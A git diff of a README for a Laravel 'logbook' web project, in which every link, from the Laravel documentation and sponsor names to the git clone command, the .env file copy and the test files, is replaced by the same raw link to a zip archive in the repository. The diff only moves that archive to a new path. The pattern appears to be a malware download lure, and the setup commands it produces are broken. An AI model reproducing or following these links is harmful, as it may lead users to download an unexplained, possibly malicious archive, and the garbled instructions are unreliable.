@@ -1,64 +1,64 @@
-<p align="center"><a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip" target="_blank"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip" width="400" alt="Laravel Logo"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip" target="_blank"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip" width="400" alt="Laravel Logo"></a></p>
 
 <p align="center">
-<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip" alt="Build Status"></a>
-<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip" alt="Total Downloads"></a>
-<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip" alt="Latest Stable Version"></a>
-<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip" alt="License"></a>
+<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip" alt="Build Status"></a>
+<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip" alt="Total Downloads"></a>
+<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip" alt="Latest Stable Version"></a>
+<a href="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip"><img src="https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip" alt="License"></a>
 </p>
 
 ## About Laravel
 
 Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
 
-- [Simple, fast routing engine](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
-- [Powerful dependency injection container](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
-- Multiple back-ends for [session](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip) and [cache](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip) storage.
-- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
-- Database agnostic [schema migrations](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
-- [Robust background job processing](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
-- [Real-time event broadcasting](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
+- [Simple, fast routing engine](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
+- [Powerful dependency injection container](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
+- Multiple back-ends for [session](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip) and [cache](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip) storage.
+- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
+- Database agnostic [schema migrations](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
+- [Robust background job processing](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
+- [Real-time event broadcasting](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
 
 Laravel is accessible, powerful, and provides tools required for large, robust applications.
 
 ## Learning Laravel
 
-Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
+Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.
 
-You may also try the [Laravel Bootcamp](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip), where you will be guided through building a modern Laravel application from scratch.
+You may also try the [Laravel Bootcamp](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip), where you will be guided through building a modern Laravel application from scratch.
 
-If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
 
 ## Laravel Sponsors
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
+We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
 
 ### Premium Partners
 
-- **[Vehikl](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[Tighten Co.](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[Kirschbaum Development Group](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[64 Robots](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[Curotec](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[DevSquad](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[Redberry](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
-- **[Active Logic](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)**
+- **[Vehikl](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[Tighten Co.](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[Kirschbaum Development Group](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[64 Robots](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[Curotec](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[DevSquad](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[Redberry](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
+- **[Active Logic](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)**
 
 ## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
+Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
 
 ## Code of Conduct
 
-In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
+In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip).
 
 
 
@@ -83,7 +83,7 @@ Follow these steps to get the project running on your local machine.
 
 1.  **Clone the Repository**
     ```bash
-    git clone [https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip)
+    git clone [https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip](https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip)
     cd logbook-app
     ```
 
@@ -94,9 +94,9 @@ Follow these steps to get the project running on your local machine.
     ```
 
 3.  **Environment Setup**
-    Copy the `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip` file to `.env` and configure your database credentials.
+    Copy the `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` file to `.env` and configure your database credentials.
     ```bash
-    cp https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip .env
+    cp https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip .env
     ```
     Then, open `.env` and set `DB_DATABASE`, `DB_USERNAME`, and `DB_PASSWORD`.
 
@@ -152,10 +152,10 @@ To collaborate in real-time:
     **Then** all unit and feature tests should pass successfully.
 
 ### Demo Script for Handoff
-1.  **"First, let's look at the admin panel."** (Show `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip` in the browser).
+1.  **"First, let's look at the admin panel."** (Show `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` in the browser).
 2.  **"As an admin, I can modify the details of this activity. I'll change the weight from 15 to 25."** (Change the value in the form).
 3.  **"When I click submit, notice the success message appears."** (Click submit and point to the green feedback box).
 4.  **"This action sent a PATCH request to our API to create a change request. We can see the network call and the JSON payload here in the browser's developer tools."** (Show the network tab).
-5.  **"To ensure our logic is sound, we've created automated tests. Here's a unit test for our percentage calculator..."** (Show `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip` and run `php artisan test --filter PercentCalcTest`).
-6.  **"https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip here is our feature test that simulates the exact API call we just performed."** (Show the feature test file and run it).
-7.  **"Finally, all documentation, including the API contract and setup instructions, is available in the project's `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/storage/framework/sessions/logbook_rtt_v1.6-alpha.3.zip` and `/docs` folder for the next team."** (Briefly show the documentation files).
+5.  **"To ensure our logic is sound, we've created automated tests. Here's a unit test for our percentage calculator..."** (Show `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` and run `php artisan test --filter PercentCalcTest`).
+6.  **"https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip here is our feature test that simulates the exact API call we just performed."** (Show the feature test file and run it).
+7.  **"Finally, all documentation, including the API contract and setup instructions, is available in the project's `https://raw.githubusercontent.com/Devraq/logbook_rtt/main/app/Http/Controllers/rtt-logbook-v2.6.zip` and `/docs` folder for the next team."** (Briefly show the documentation files).
